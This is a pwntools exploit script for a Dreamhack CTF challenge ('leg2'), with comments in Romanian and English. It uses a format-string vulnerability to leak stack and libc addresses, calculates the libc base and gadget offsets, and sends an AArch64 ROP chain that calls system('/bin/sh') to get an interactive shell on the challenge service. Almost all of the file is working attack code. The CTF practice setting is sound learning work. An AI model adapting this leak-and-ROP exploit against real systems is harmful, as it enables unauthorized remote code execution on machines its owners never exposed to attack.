from pwn import *
elf = ELF('/home/kali/Downloads/dreamhack/leg2/chal')
libc = ELF('/home/kali/Downloads/dreamhack/leg2/rootfs_extracted/lib/libc.so')

cyberedu = 'host3.dreamhack.games:17482'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
    
#pause()

#buildroot login: root
#chal

print(elf.got)
#seems like classic ret2libv but make it aarch
#avem fmtstr vuln

p.recvuntil(b"> ")
p.sendline(b"%p.%p.%p.%p.%p.%p.%p")
p.recvuntil(b"Hi! ")

data = p.recvline().strip()
stack_leak, b, libc_leak, d, e, f, leak = data.split(b'.')

leak = int(leak, 16)
libc_leak = int(libc_leak, 16)
stack_leak = int(stack_leak, 16)

base = leak - 0xc90
libc_addr = libc_leak - 0x46f4c
system = libc_addr + 0x3e9b4
execve = libc_addr + 0x3de4c

#vuln = base + 0x0100bd0
print(f"base is {hex(base)}")
print(f"libc is {hex(libc_addr)}")
print(f"stack_leak is {hex(stack_leak)}")
#no binsh, no problem. scriem noi in payload + stack leak.
#x0 is null at za moment 
#si x1 e exact inceputul inputului
#wait poate avem gadgets in libc(?)

stack_binsh = stack_leak + 0x1c0
print(f"on the stack, binsh is at {hex(stack_binsh)}")
p.recvuntil(b"> ")

#0x000000000001ae30: mov x0, x1; ldp x19, x30, [sp], #0x10; ret; 
#X0 <- X1
mov_x0_x1_ldp_x19_x30 = libc_addr + 0x1ae30

#0x000000000003cae8: ldr x0, [sp, #0x18]; ldp x19, x30, [sp], #0x20; ret;
#X0 <- SP+0x18
ldr_x0_sp18_ldp_x19_x30 = libc_addr + 0x3cae8

libc.address = libc_addr
binsh = next(libc.search(b"/bin/sh\x00"))

payload = (b"/bin/sh\x00" +
           p64(0x0) +
           b"A"*(256-8-8) +  #auStack_100
           b"B"*8 + #x29
           p64(ldr_x0_sp18_ldp_x19_x30) + #SP HERE
           p64(0x19) + #x19
           p64(system) +
           p64(0xdeadbeef) +
           p64(binsh)
           )
           
#in x1 nu ajunge ce trebuie - ceva ce contine un alt pointer catre stack.
#ok      
#always ajunge sa faca sh de addr_stack_binsh - 10.
#am schimbat in libc.search si o mers

p.send(payload)
p.interactive()
